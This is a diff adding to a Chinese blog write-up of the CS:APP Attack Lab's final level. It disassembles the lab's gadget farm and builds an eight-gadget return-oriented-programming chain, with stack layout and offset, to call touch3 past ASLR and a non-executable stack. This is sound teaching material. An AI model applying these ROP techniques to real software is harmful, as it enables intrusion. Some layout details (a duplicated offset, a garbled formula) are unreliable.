@@ -197,7 +197,7 @@ touch3 会调用函数 hexmatch, hexmatch 会调用 strncmp, 意味着栈会向�
 
 奇怪没有 level 1, 直接从 level 2 开始.
 
-栈空间布局随机初始化, 加上不可执行栈, 使得在栈上注入代码困难.
+地址空间布局随机初始化(ASLR), 加上不可执行栈, 使得在栈上注入代码困难.
 
 于是不直接注入代码, 而是利用汇编编译器生成的代码(机器码是一个二进制流, 同样一个流, 从不同的地方开始解析有不同的含义).
 
@@ -304,3 +304,470 @@ c3      ret
 > Moreover, Phase 5 counts for only 5 points, which is not a true measure of the effort it will require.
 
 老外的文档还是挺有意思的, 居然让人放弃, 显然是欲擒故纵啊, 不过成功地引起了我的兴趣. 嗯, 就是好了前两天拆炸弹最后一个 phase 的伤疤忘了疼.
+
+废话不多说, 正式开始.
+
+```c
+/* Compare string to hex represention of unsigned value */
+int hexmatch(unsigned val, char *sval) {
+    char cbuf[110];
+    /* Make position of check string unpredictable */
+    char *s = cbuf + random() % 100;
+    sprintf(s, "%.8x", val);
+    return strncmp(sval, s, 9) == 0;
+}
+
+void touch3(char *sval) {
+    vlevel = 3;
+    /* Part of validation protocol */
+    if (hexmatch(cookie, sval)) {
+        printf("Touch3!: You called touch3(\"%s\")\n", sval);
+        validate(3);
+    } else {
+        printf("Misfire: You called touch3(\"%s\")\n", sval);
+        fail(3);
+    }
+    exit(0);
+}
+```
+
+总的方向: 这里需要 cookie 字符串在栈上的指针, 由于地址空间布局随机初始化, 我们不能去设计一个具体的地址, 那么只有利用 rsp 做文章了. 要做的核心就是 `rsp -> rdi`
+
+先找一下可用的 gadget, 这段人工反汇编有点累...
+
+```
+0000000000401994 <start_farm>:
+  401994:   b8 01 00 00 00          mov    $0x1,%eax
+  401999:   c3                      retq   
+
+000000000040199a <getval_142>:
+  40199a:   b8 fb 78 90 90          mov    $0x909078fb,%eax
+  40199f:   c3                      retq   
+
+00000000004019a0 <addval_273>:
+  4019a0:   8d 87 48 89 c7 c3       lea    -0x3c3876b8(%rdi),%eax
+  4019a6:   c3                      retq   
+
+        :   48 89 c7                mov     %rax,%rdi
+        :   c3                      retq    
+
+        :   89 c7                   mov     %eax,%edi
+        :   c3                      retq    
+
+00000000004019a7 <addval_219>:
+  4019a7:   8d 87 51 73 58 90       lea    -0x6fa78caf(%rdi),%eax
+  4019ad:   c3                      retq   
+
+        :   58                      pop     %rax
+        :   90                      nop     
+        :   c3                      retq
+
+00000000004019ae <setval_237>:
+  4019ae:   c7 07 48 89 c7 c7       movl   $0xc7c78948,(%rdi)
+  4019b4:   c3                      retq   
+
+00000000004019b5 <setval_424>:
+  4019b5:   c7 07 54 c2 58 92       movl   $0x9258c254,(%rdi)
+  4019bb:   c3                      retq   
+
+00000000004019bc <setval_470>:
+  4019bc:   c7 07 63 48 8d c7       movl   $0xc78d4863,(%rdi)
+  4019c2:   c3                      retq   
+
+00000000004019c3 <setval_426>:
+  4019c3:   c7 07 48 89 c7 90       movl   $0x90c78948,(%rdi)
+  4019c9:   c3                      retq   
+
+00000000004019ca <getval_280>:
+  4019ca:   b8 29 58 90 c3          mov    $0xc3905829,%eax
+  4019cf:   c3                      retq   
+
+00000000004019d0 <mid_farm>:
+  4019d0:   b8 01 00 00 00          mov    $0x1,%eax
+  4019d5:   c3                      retq   
+
+00000000004019d6 <add_xy>:
+  4019d6:   48 8d 04 37             lea    (%rdi,%rsi,1),%rax
+  4019da:   c3                      retq   
+
+00000000004019db <getval_481>:
+  4019db:   b8 5c 89 c2 90          mov    $0x90c2895c,%eax
+  4019e0:   c3                      retq   
+
+        :   5c                      popq   %rsp
+        :   89 c2                   mov    %eax, %edx
+        :   90                      nop
+        :   c3                      retq
+
+00000000004019e1 <setval_296>:
+  4019e1:   c7 07 99 d1 90 90       movl   $0x9090d199,(%rdi)
+  4019e7:   c3                      retq   
+
+00000000004019e8 <addval_113>:
+  4019e8:   8d 87 89 ce 78 c9       lea    -0x36873177(%rdi),%eax
+  4019ee:   c3                      retq   
+
+00000000004019ef <addval_490>:
+  4019ef:   8d 87 8d d1 20 db       lea    -0x24df2e73(%rdi),%eax
+  4019f5:   c3                      retq   
+
+        :   20 db                   andb   %bl, %bl
+        :   c3                      retq
+
+00000000004019f6 <getval_226>:
+  4019f6:   b8 89 d1 48 c0          mov    $0xc048d189,%eax
+  4019fb:   c3                      retq   
+
+00000000004019fc <setval_384>:
+  4019fc:   c7 07 81 d1 84 c0       movl   $0xc084d181,(%rdi)
+  401a02:   c3                      retq   
+
+        :   84 c0                   testb  %al,%al
+        :   c3                      retq   
+
+0000000000401a03 <addval_190>:
+  401a03:   8d 87 41 48 89 e0       lea    -0x1f76b7bf(%rdi),%eax
+  401a09:   c3                      retq   
+
+        :   48 89 e0                mov    %rsp,%rax
+        :   c3                      retq    
+
+        :   89 e0                   mov    %esp,%eax
+        :   c3                      retq    
+
+0000000000401a0a <setval_276>:
+  401a0a:   c7 07 88 c2 08 c9       movl   $0xc908c288,(%rdi)
+  401a10:   c3                      retq   
+
+        :   08 c9                   orb    %cl,%cl
+        :   c3                      retq   
+
+0000000000401a11 <addval_436>:
+  401a11:   8d 87 89 ce 90 90       lea    -0x6f6f3177(%rdi),%eax
+  401a17:   c3                      retq   
+
+        :   89 ce                   mov    %ecx,%esi
+        :   90                      nop
+        :   90                      nop
+        :   c3                      retq
+
+0000000000401a18 <getval_345>:
+  401a18:   b8 48 89 e0 c1          mov    $0xc1e08948,%eax
+  401a1d:   c3                      retq   
+
+0000000000401a1e <addval_479>:
+  401a1e:   8d 87 89 c2 00 c9       lea    -0x36ff3d77(%rdi),%eax
+  401a24:   c3                      retq   
+
+0000000000401a25 <addval_187>:
+  401a25:   8d 87 89 ce 38 c0       lea    -0x3fc73177(%rdi),%eax
+  401a2b:   c3                      retq   
+
+        :   89 ce                   mov     %ecx,%esi
+        :   38 c0                   cmpb    %al,%al
+        :   c3                      retq    
+
+0000000000401a2c <setval_248>:
+  401a2c:   c7 07 81 ce 08 db       movl   $0xdb08ce81,(%rdi)
+  401a32:   c3                      retq   
+
+        :   08 db                   orb    %bl,%bl
+        :   c3                      retq   
+
+0000000000401a33 <getval_159>:
+  401a33:   b8 89 d1 38 c9          mov    $0xc938d189,%eax
+  401a38:   c3                      retq   
+
+        :   89 d1                   mov    %edx,%ecx
+        :   38 c9                   cmpb   %cl,%cl
+        :   c3                      retq   
+
+0000000000401a39 <addval_110>:
+  401a39:   8d 87 c8 89 e0 c3       lea    -0x3c1f7638(%rdi),%eax
+  401a3f:   c3                      retq   
+
+0000000000401a40 <addval_487>:
+  401a40:   8d 87 89 c2 84 c0       lea    -0x3f7b3d77(%rdi),%eax
+  401a46:   c3                      retq   
+
+        :   89 c2                   mov    %eax,%edx
+        :   84 c0                   testb  %al,%al
+        :   c3                      retq   
+
+0000000000401a47 <addval_201>:
+  401a47:   8d 87 48 89 e0 c7       lea    -0x381f76b8(%rdi),%eax
+  401a4d:   c3                      retq   
+
+0000000000401a4e <getval_272>:
+  401a4e:   b8 99 d1 08 d2          mov    $0xd208d199,%eax
+  401a53:   c3                      retq   
+
+        :   08 d2                   orb    %dl,%dl
+        :   c3                      retq
+
+0000000000401a54 <getval_155>:
+  401a54:   b8 89 c2 c4 c9          mov    $0xc9c4c289,%eax
+  401a59:   c3                      retq   
+
+0000000000401a5a <setval_299>:
+  401a5a:   c7 07 48 89 e0 91       movl   $0x91e08948,(%rdi)
+  401a60:   c3                      retq   
+
+0000000000401a61 <addval_404>:
+  401a61:   8d 87 89 ce 92 c3       lea    -0x3c6d3177(%rdi),%eax
+  401a67:   c3                      retq   
+
+0000000000401a68 <getval_311>:
+  401a68:   b8 89 d1 08 db          mov    $0xdb08d189,%eax
+  401a6d:   c3                      retq   
+
+        :   89 d1                   mov    %edx,%ecx
+        :   08 db                   orb    %bl,%bl
+        :   c3                      retq   
+
+0000000000401a6e <setval_167>:
+  401a6e:   c7 07 89 d1 91 c3       movl   $0xc391d189,(%rdi)
+  401a74:   c3                      retq   
+
+0000000000401a75 <setval_328>:
+  401a75:   c7 07 81 c2 38 d2       movl   $0xd238c281,(%rdi)
+  401a7b:   c3                      retq   
+
+        :   38 d2                   cmpb   %dl,%dl
+        :   c3                      retq   
+
+0000000000401a7c <setval_450>:
+  401a7c:   c7 07 09 ce 08 c9       movl   $0xc908ce09,(%rdi)
+  401a82:   c3                      retq   
+
+        :   08 c9                   orb    %cl,%cl
+        :   c3                      retq   
+
+0000000000401a83 <addval_358>:
+  401a83:   8d 87 08 89 e0 90       lea    -0x6f1f76f8(%rdi),%eax
+  401a89:   c3                      retq   
+
+        :   89 e0
+        :   90
+        :   c3
+
+0000000000401a8a <addval_124>:
+  401a8a:   8d 87 89 c2 c7 3c       lea    0x3cc7c289(%rdi),%eax
+  401a90:   c3                      retq   
+
+0000000000401a91 <getval_169>:
+  401a91:   b8 88 ce 20 c0          mov    $0xc020ce88,%eax
+  401a96:   c3                      retq   
+
+        :   20 c0                   andb   %al,%al
+        :   c3                      retq
+
+0000000000401a97 <setval_181>:
+  401a97:   c7 07 48 89 e0 c2       movl   $0xc2e08948,(%rdi)
+  401a9d:   c3                      retq   
+
+0000000000401a9e <addval_184>:
+  401a9e:   8d 87 89 c2 60 d2       lea    -0x2d9f3d77(%rdi),%eax
+  401aa4:   c3                      retq   
+
+0000000000401aa5 <getval_472>:
+  401aa5:   b8 8d ce 20 d2          mov    $0xd220ce8d,%eax
+  401aaa:   c3                      retq   
+
+        :   20 d2                   andb   %dl,%dl
+        :   c3                      retq   
+
+0000000000401aab <setval_350>:
+  401aab:   c7 07 48 89 e0 90       movl   $0x90e08948,(%rdi)
+  401ab1:   c3                      retq   
+
+0000000000401ab2 <end_farm>:
+  401ab2:   b8 01 00 00 00          mov    $0x1,%eax
+  401ab7:   c3                      retq   
+  401ab8:   90                      nop
+  401ab9:   90                      nop
+  401aba:   90                      nop
+  401abb:   90                      nop
+  401abc:   90                      nop
+  401abd:   90                      nop
+  401abe:   90                      nop
+  401abf:   90                      nop
+```
+
+整理一下
+
+```
+        :   48 89 c7                mov     %rax,%rdi
+        :   c3                      retq    
+
+        :   89 c7                   mov     %eax,%edi
+        :   c3                      retq    
+
+        :   58                      pop     %rax
+        :   90                      nop     
+        :   c3                      retq
+
+        :   5c                      popq   %rsp
+        :   89 c2                   mov    %eax, %edx
+        :   90                      nop
+        :   c3                      retq
+
+        :   20 db                   andb   %bl, %bl
+        :   c3                      retq
+
+        :   84 c0                   testb  %al,%al
+        :   c3                      retq   
+
+        :   48 89 e0                mov    %rsp,%rax
+        :   c3                      retq    
+
+        :   89 e0                   mov    %esp,%eax
+        :   c3                      retq    
+
+        :   08 c9                   orb    %cl,%cl
+        :   c3                      retq   
+
+        :   89 ce                   mov    %ecx,%esi
+        :   90                      nop
+        :   90                      nop
+        :   c3                      retq
+
+        :   89 ce                   mov     %ecx,%esi
+        :   38 c0                   cmpb    %al,%al
+        :   c3                      retq    
+
+        :   08 db                   orb    %bl,%bl
+        :   c3                      retq   
+
+        :   89 d1                   mov    %edx,%ecx
+        :   38 c9                   cmpb   %cl,%cl
+        :   c3                      retq   
+
+        :   89 c2                   mov    %eax,%edx
+        :   84 c0                   testb  %al,%al
+        :   c3                      retq
+
+        :   08 d2                   orb    %dl,%dl
+        :   c3                      retq
+
+        :   89 d1                   mov    %edx,%ecx
+        :   08 db                   orb    %bl,%bl
+        :   c3                      retq   
+
+        :   38 d2                   cmpb   %dl,%dl
+        :   c3                      retq   
+
+        :   08 c9                   orb    %cl,%cl
+        :   c3                      retq   
+
+        :   20 c0                   andb   %al,%al
+        :   c3                      retq
+
+        :   20 d2                   andb   %dl,%dl
+        :   c3                      retq   
+```
+
+发现涉及到 rsp 的有三处
+
+```asm
+58        pop     %rax
+90        nop     
+c3        retq
+
+
+48 89 e0  mov    %rsp,%rax
+c3        retq
+
+
+5c        popq   %rsp
+89 c2     mov    %eax, %edx
+90        nop
+c3        retq
+```
+
+由于地址空间布局随机初始化, `popq %rsp` 对我们来说没什么用, 所以可以利用的就是前两处, 前者可以用来传栈上的数据到寄存器, 后者可以知道栈顶位置.
+
+观察可用的 gadget, 只会让栈指针增大(单调的, 意味着我们对 gadget 调用顺序是按栈地址从低到高依次顺序调用), 那么我们必须把 cookie 放最后(高地址), &touch3 次之, 这样才能保证 cookie 不被覆盖.
+
+观察可能的数据流动方向
+
+```
+rsp --> rax --> rdi
+
+esp
+ |
+ +---> eax --> edx --> ecx --> esi
+ |
+edi
+```
+
+`rsp --> rdi` 需要中途经过 rax, 这里至少需要两个 gadget, 并且 rsp 传到 rdi 的值不可能直接是 &cookie(中间存在 ret, 会修改 rsp), 意味着我们将 rsp 赋值给 rdi 后, 还需要对 rdi 进行修正.
+
+查看 dadget, 发现了一个 lea 指令(`lea    (%rdi,%rsi,1),%rax`)可以用来调整 rdi, 问题可以解决.
+
+大体流程如下
+
+```
+rsp --> rax --> rdi --修正--> rdi
+```
+
+修正时需要借助 rsi, 利用数据流 `eax --> edx --> ecx --> esi` 将修正量 `delta` 传给 esi.
+
+用到的 8 个 dadget 如下(省略了部分指令, 如 nop, cmpb 等), 与 writeup 中说的数量相同
+
+```
+g0:     pop     rax                    ---
+        ret                             |
+                                        |
+g1:     mov     eax, edx                |
+        ret                             |
+                                传递 delta 给 esi
+g2:     mov     edx, ecx                |
+        ret                             |
+                                        |
+g3:     mov     ecx, esi                |
+        ret                            ---
+        
+g4:     mov     rsp, rax               ---
+        ret                             |
+                                   获得栈顶地址 
+g5:     mov     rax, rdi                |
+        ret                            ---
+                                        |
+g6:     lea     (rdi, rsi, 1), rax      |
+        ret                        修正 rdi
+                                        |
+g7      mov     rax, rdi                |
+        ret                            ---
+```
+
+按如下注入代码
+
+```
+                +--------+
+                |        |
+                |        |       Gets 栈帧, 保存了 3 个寄存器
+                |        |
+                ----------
+                |        |       Gets 返回地址
+&buf:           |        |       从这里开始接收输入
+                |        |
+                |        |       getbuf 栈帧, 分配了 0x28 个字节
+                |        |
+&buf + 0x20:    |        |
+&buf + 0x28:    | &g0    |       getbuf 返回地址
+&buf + 0x30:    | delta  |
+&buf + 0x38:    | &g1    |
+&buf + 0x40:    | &g2    |
+&buf + 0x48:    | &g3    |
+&buf + 0x50:    | &g4    |
+&buf + 0x58:    | &g5    |
+&buf + 0x60:    | &g6    |
+&buf + 0x60:    | &g7    |
+&buf + 0x68:    | &touch3|
+&buf + 0x70:    | cookie |
+&buf + 0x78:    | \0     |       结束的 \0 不是必须的, 因为 Gets 会自动在末尾附加 \0
+                ----------
+```
+
+最后说一下关于 `delta` 的计算, 在获取栈顶指针时(执行 g4), 此时 rsp 指向 g5, `&cookie - &cookie = 0x20`, 所以 `delta` 应该是 0x20.
